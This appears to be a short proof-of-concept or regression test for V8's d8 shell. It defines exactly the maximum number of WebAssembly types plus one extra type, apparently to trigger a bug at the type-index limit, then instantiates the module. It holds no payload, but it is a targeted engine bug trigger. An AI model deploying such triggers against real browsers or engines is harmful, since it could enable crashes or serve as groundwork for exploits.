d8.file.execute("wasm-module-builder.js");

const kV8MaxWasmTypes = 1000000;

const builder = new WasmModuleBuilder();

builder.startRecGroup();
for (let i = 0; i < kV8MaxWasmTypes; i++) {
    builder.addType(makeSig([], []));
}
builder.endRecGroup();

let idx = builder.addType(makeSig([], []));
console.log(`[+] idx == ${idx}`);

builder.instantiate();
